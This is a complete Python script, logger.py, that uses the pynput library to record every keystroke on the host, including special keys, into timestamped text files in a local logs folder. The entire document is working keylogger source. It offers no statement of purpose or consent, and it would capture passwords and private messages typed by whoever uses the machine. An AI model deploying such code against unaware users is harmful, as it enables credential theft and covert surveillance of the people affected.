# logger.py
from pynput import keyboard
import logging
from datetime import datetime
import os

# Ensure logs folder exists
if not os.path.exists("logs"):
    os.makedirs("logs")

# Create a unique log file
log_file = f"logs/keystrokes-{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt"

# Configure logging
logging.basicConfig(
    filename=log_file,
    level=logging.DEBUG,
    format='%(asctime)s: %(message)s'
)

def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key: {key}")

def run_logger():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    run_logger()
